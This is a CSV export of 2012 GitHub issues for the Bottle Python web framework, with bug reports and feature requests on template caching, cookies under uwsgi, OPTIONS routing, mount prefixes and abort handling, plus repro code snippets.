ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
410,it is a bug of template cache?,2012-11-29T09:49:26Z,,,,,"If you use the view decorator, maybe it would never hit the template cache.
Because the parameter passed by view function is always tpl_name, but the key of TEMPLATES is tplid.

``` python
def view(tpl_name, **defaults):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            if isinstance(result, (dict, DictMixin)):
                tplvars = defaults.copy()
                tplvars.update(result)
                return template(tpl_name, **tplvars)
            return result
        return wrapper
    return decorator

def template(*args, **kwargs):
    tpl = args[0] if args else None
    adapter = kwargs.pop('template_adapter', SimpleTemplate)
    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)
    tplid = (id(lookup), tpl)
    if tpl not in TEMPLATES or DEBUG:
        settings = kwargs.pop('template_settings', {})
        if isinstance(tpl, adapter):
            TEMPLATES[tplid] = tpl
            if settings: TEMPLATES[tplid].prepare(**settings)
        elif ""\n"" in tpl or ""{"" in tpl or ""%"" in tpl or '$' in tpl:
            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)
        else:
            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)
    if not TEMPLATES[tplid]:
        abort(500, 'Template (%s) not found' % tpl)
    for dictarg in args[1:]: kwargs.update(dictarg)
    return TEMPLATES[tplid].render(kwargs)
```
"
409,recipe for call_wsgi has typo,2012-11-28T15:12:22Z,2012-12-04T18:19:42Z,,,,"The recipe for routing to sub WSGI apps has a typo, instead of ""method='ALL'"" it should read ""method='ANY'"".  This is the online link: http://bottlepy.org/docs/dev/recipes.html#embedding-other-wsgi-apps
"
408,"issue 407, ""why render empty string when using @view and no return statement?""",2012-11-27T18:18:15Z,2012-11-27T18:28:21Z,,,,
407,why render empty string when using @view and no return statement?,2012-11-27T15:44:01Z,2012-11-27T18:31:49Z,,,,"I understand mechanistically why this is happening. But it seems sensible to me, that given that Python does nothing to enforce that a return statement is present ,  that if a route-method returns None and a @view decorator is in place, the template should be rendered with the empty dict. (As opposed to rendering the empty string).
"
406,Added support for arrays in POST requests,2012-11-23T12:28:37Z,,,,,"You can now send form via POST with HTMLElement names like my_arr[] and myarr[key]
"
405,Jinja2 Tempate cacheing seems to be broken in 0.11.3,2012-11-21T14:18:48Z,2012-11-21T16:01:31Z,,,,"After upgrading from bottle 0.10.11 to bottle 0.11.3, I noticed a masive drop in performance.

The difference is severe in a production environment, from about 2000 pages/s it dropped to about 90 pages/s.

So, with some more investigation I have narrowed it down to Jinja2 recompiling the template on every serve, instead of cacheing it.

I also didn't find any reference in the documentation as to if there is a usage change on using Jinja2 templates, and downgrading to bottle 0.10.11 resolved the performance issue.
"
404,Unicode path in response.set_cookie() failed with uwsgi >= 1.3,2012-11-19T04:57:13Z,,,TypeError,TypeError: http header value must be a string,"I'm getting a strange error after uwsgi, after hard tries I found the following code could run properly using bottle.run() or with uwsgi <= 1.2, but causes a 500 error with uwsgi >= 1.3.

The error looks like:

```
File "".../bottle.py"", line 837, in wsgi
     start_response(response._status_line, list(response.iter_headers())) 
TypeError: http header value must be a string
```

Test code:

```
from bottle import get, response, default_app, debug

@get(""/test/cookie"")
def test_cookie():
    response.set_cookie(""test"", ""test"", path=u""/"")

debug(True)
application = default_app()
```
"
403,Add a way to programmatically terminate the run() loop,2012-11-18T01:33:09Z,,,,,"Currently calling run() never returns, and I have to terminate the server loop with Ctrl-C. I would like some API to terminate the loop programmatically from within a request handler.
"
402,Handling the OPTIONS method,2012-11-17T21:04:10Z,2016-09-05T10:25:37Z,,,,"My app needs to handle cross-domain requests. This means that I need to handle the OPTIONS method, because the browser will send OPTIONS <path> before GET <path>. Handling this is not very convenient in Bottle, because I need to double the number of the routes. The other way to do it would be the catch-all route:

```
@bottle.route('/<:re:.*>', method='OPTIONS')
```

but this won't of course work - depending on the order of definitions, either the OPTIONS will not work, either the GET.

Currently, all my OPTIONS handlers do the same thing, so a single function is enough. Is there a way to handle this nicely? If not, then I think this case is specific enough to make an exception in the routing mechanism.
"
401,Bottle fails with Python 2.7+threadsafe on Google App Engine,2012-11-17T17:11:28Z,2012-11-17T19:21:04Z,,TypeError,TypeError: __call__ takes exactly 1 argument (3 given),"app.yaml:

```
application: my-app
version: 1
runtime: python27
api_version: 1
threadsafe: yes

- url: .*
  script: main.app
```

main.py:

```
import bottle

@bottle.route('/')
def root():
    return 'hello world'

bottle.run(server='gae', debug=True)
```

When I run this, the I get error in the console:

```
module main has no attribute app
```

When I try to fix this:

```
from bottle import app
```

then I get error in console:

```
TypeError: __call__ takes exactly 1 argument (3 given)
```

When I just specify main.py as the handler in app.yaml, then GAE complains that ""threadsafe cannot be enabled with CGI handler: main.py"".
"
400,Routing error with multiple Bottle objects and overlapping mount_prefixes,2012-11-16T10:33:10Z,,,,,"When using multiple bottle objects where one of the mount_prefix is a subset of another, the routes in the longer mount_prefix do not get resolved correctly (resulting in not-found errors). The attached example reproduces the problem.

``` python
'''
This is an example to recreate a problem scenario with having two Bottle Application Objects having  
mount prefix. The mount prefixes in our case are 
/testing/
/testing/submount

This leads to issues when trying to add routes under the second Bottle App, i.e. they become unaccessable.   

In this example, we have the following routes:

main_server is the default_app that represents the main server. 
    / is a convenience route to allow quick linking to all the test scenarios
    The main_server has 2 bottle apps:
        1. /testing/, which has the following routes:
            a./testing/index returns ""hello""
        2. /testing/submount, which has the following routes:
            a. / which returns ""submount-slash says hello""
            b. /hello2 which returns ""submount-hello2 says hello""    (This route will not work due to the bug.)
'''
import argparse
import bottle

#create default app.
main_server = bottle.default_app()

# create endpoints
ep1 = bottle.Bottle()
main_server.mount('/testing', ep1)

@ep1.route(path='/hello', method='GET')
def hello():
    return 'hello'

ep2 = bottle.Bottle()
main_server.mount('/testing/submount', ep2)

@ep2.route(path='/', method='GET')
def submountslash():
    return 'submountslash says hello'

@ep2.route(path='/hello2', method='GET')
def hello2():
    return 'submount-hello2 says hello'

@bottle.route(path='/', method='GET')
def index():
    return """"""
    <p>
    This simple program is to illustrate and reproduce what seems to be a 
    bug in bottle when working with multiple Bottle objects with one mount_prefix that is a substring of another mount_prefix.
    <p>
    The routes are
    <ul>
    <li> <a href=""/"">/</a> -- the output prints this message
    <li> <a href=""/testing/hello"">/testing/hello</a> -- outputs <em>hello</em> (this is a route on a 1st Bottle object with mount_prefix as '/testing'
    <li> <a href=""/testing/submount"">/testing/submount</a> -- outputs <em>submountslash says hello</em> (this is a route on a 2nd Bottle object with mount_prefix as '/testing/submount)'
    <li> <a href=""/testing/submount/hello2"">/testing/submount/hello2</a> -- SHOULD output <em>submount-hello2 says hello</em> but instead gives an error. We believe this to be a bug.
    </ul>
    """"""

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bottle App Issues.')
    parser.add_argument('--host', dest='host', default='localhost', type=str, help='Hostname / IP address of this server (default: localhost)')
    parser.add_argument('--port', dest='port', default=9000, type=int, help='Port Number to run the server on (default: 9000)') 
    args = parser.parse_args()

    bottle.debug(True)
    bottle.run(app=main_server, host=args.host, port=int(args.port))
```
"
399,Don't truncate POST body.,2012-11-16T00:31:52Z,2013-02-11T16:59:38Z,,,,"BaseRequest._body() already uses MEMFILE_MAX to avoid memory exhaustion.

If this behavior was intentional, I'd suggest that this policy belongs in server config.
"
398,Cn doc,2012-11-14T07:16:59Z,2013-01-07T12:16:16Z,,,,"Hi, this is all the translated *.po files you need.

As to Chinese user, they need to change the value of ""language"" in docs/conf.py if they want to generate pdf doc.

Assuming they have xetex and ""WenQuanYi Micro Hei"" font installed, add this to conf.py

latex_preamble = '\usepackage{xeCJK}\n\setCJKmainfont{WenQuanYi Micro Hei}'
"
397,Sqlite plugin doesn't handle generators,2012-11-12T15:57:07Z,,,,,"A route handler in regular bottle is permitted to `yield` or return a generator.  The sqlite plugin wraps the call to the handler in a `try:... finally:...` that closes the database handle.

This causes problems if you write a generator that yields values lazily based on a database query, as access to the database may occur after the finally clause has been executed.
"
396,HTTPError and Abort don't send headers change (Basic Authorization don't work),2012-11-08T17:00:54Z,2012-12-16T13:55:50Z,,<pre>Error,<pre>Error: 401 Unauthorized,"Authorization form don't appear.
With:

<pre>@get('/test')
def test_page():
    response.headers['WWW-Authenticate'] = 'Basic realm=""Console""'
    abort(401, ""Authorization required"")</pre>

Displays only:

<pre>Error: 401 Unauthorized
Sorry, the requested URL 'http://127.0.0.1:8082/test' caused an error:
Authorization required</pre>


With:

<pre>def check_auth(user, password):
    return False

@get('/test')
@auth_basic(check_auth)
def test_page():
    return 'test'</pre>

Displays only:

<pre>Error: 401 Unauthorized
Sorry, the requested URL 'http://127.0.0.1:8082/test' caused an error:
Access denied</pre>
"
395,raises DeprecationWarning in bottle.mount(),2012-11-07T11:48:30Z,2012-12-22T20:07:39Z,,,,"```
bottle.py:571: DeprecationWarning: Call signature changed (for the better)
  return HTTPResponse(body, rs.status_code, rs.headers)
```
"
394,get_url missing in Macports?,2012-11-02T07:07:25Z,,,,,"I am using macports: python27 @2.7.3_1 and py27-bottle @0.10.9_0 

Everything has been running smooth until I ran into this tonight after trying to setup static files with relative paths.

from bottle import Bottle, run, route, view, template, static_file, get_url
- ImportError: cannot import name get_url

I also get the same importing just Bottle and trying Bottle.get_url
"
393,Append custom headers to reponse,2012-10-31T14:43:05Z,,,,,
392,mod_rewrite for bottle,2012-10-29T06:47:19Z,2012-10-29T14:35:30Z,,,,"Hi, 
I added code to mimic Apache's mod_rewrite:

URL are processed by a set of regular expressions _before_ they are processed by the routing system.
A set of examples can be found at the bottom of the code I added.

If this is something you are interested in, please modify, adapt and relocate it just as you need it!

_A case for this feature:_
If you want your server to react to two different paths, you'd have to copy each @route decorator. 
This way, a simple rule would handle it.

PS: Please be nice, my Python experiences are only some weeks old :)
"
391,Update docs/stpl.rst,2012-10-20T05:17:17Z,2012-10-20T18:14:34Z,,,,"The name ""Inline Statements"" seems misleading. If the Python code has to ""return a string or something that has a string representation"", you can _never_ use a Python statement there, only a Python expression, since statements don't return anything. I suggest mimicking the Python nomenclature and calling them ""Inline Expressions"" instead.
"
390,Bottle mangles abort when tcp stream not completed,2012-10-18T17:33:31Z,,,"{""error""","{""error"": ""Unrecognized event 'order+request'.""}","I think this is a bug in bottle. Or maybe its just my lack of understanding how bottle handles multipacket POSTs.
Bottle is calling my endpoint app before the complete POST packet has been received. But it seems that
the abort should not be mangled even if the whole stream as not been completed.

version 0.11 bottle python2.6 centos

My app checks the url path and if it does recognize a segment it aborts with a 400 error. 
JSON with the following content
{""error"": ""Unrecognized event 'order+request'.""}

This causes bottle to generate the following error

""POST /jofa/order/notify/TPI_Engineered_98728/order+request HTTP/1.1"" 400 188 0.001014
apps.orem.jiveip.net - - [18/Oct/2012 11:13:19] code 400, message Bad HTTP/0.9 request type ('<?xml')
apps.orem.jiveip.net - - [18/Oct/2012 11:13:19] ""<?xml version=""1.0""?>"" 400 -

When I look at the stack trace in wireshark. Bottle is returning the error before the incoming request has completed. The request is spread across two tcp packets.

The problem goes away if I  do
bottle.request.body.getvalue() before I look at the url and send the abort
Whereas if I send the abort before i read then the error occurs.
In both cases the abort is sent. But in the working case I get a valid 400 error not the mangled one.
Valid error
HTTP/1.1 400 Bad Request
Date: Thu, 18 Oct 2012 17:30:23 GMT
Content-Length: 48
Content-Type: application/json
Connection: close
{""error"": ""Unrecognized event 'order+request'.""}

DeprecationWarning: Use HTTPResponse.body instead of HTTPResponse.output

Abort method
@app.error(400)
def error400(ex):
    bottle.response.set_header('content-type', 'application/json')
    return json.dumps(dict(error=ex.output))

Erroneous Code
@app.route('/jofa/order/notify/<po>/<event>', method='GET') 
@app.route('/jofa/order/notify/<po>/<event>', method='POST')
def orderNotifyPoEventPost(po, event):

```
event = event.lower()
if event not in helping.EventMaps:
    bottle.abort(400, ""Unrecognized event '%s'."" % event)

data = bottle.request.body.getvalue()
if not data:
    bottle.abort(400, ""Missing notice body."")

...
```

Working code

@app.route('/jofa/order/notify/<po>/<event>', method='GET') 
@app.route('/jofa/order/notify/<po>/<event>', method='POST')
def orderNotifyPoEventPost(po, event):

```
data = bottle.request.body.getvalue()
if not data:
    bottle.abort(400, ""Missing notice body."")

event = event.lower()
if event not in helping.EventMaps:
    bottle.abort(400, ""Unrecognized event '%s'."" % event)


...
```

Here is the wireshark tcp stream conversation when it fails. Notice that the abort comes
back before the whole stream has completed. Ie the xml file is not complete. A subsequent tcp packet contained the rest
The bottle app is behind an Apache proxy.

POST /jofa/order/notify/TPI_Engineered_98728/order+request HTTP/1.1
Host: localhost:8081

Accept: _/_
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue

Connection: Keep-Alive
Content-Length: 39747

<?xml version=""1.0""?>
<response xmlns=""https://www.netxusa.com"">
  <requestResult>success</requestResult>
  <body><order >
  ...Snip
... Snip

```
      </setting>
      <setting>
        <name>REG_1_LINE_ENABLE</name>
        <description>This is for enabling Line 1.</description>
        <displayGroups>
          <displayGroup>SIP</displayGroup>
          <HTTP/1.1 400 Bad Request
```

Content-Length: 48
Content-Type: application/json
Date: Thu, 18 Oct 2012 16:38:32 GMT
Connection: keep-alive

{""error"": ""Unrecognized event 'order+request'.""}<head>
<title>Error response</title>
</head>
<body>

<h1>Error response</h1>

<p>Error code 400.
<p>Message: Bad HTTP/0.9 request type ('&lt;?xml').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>
"
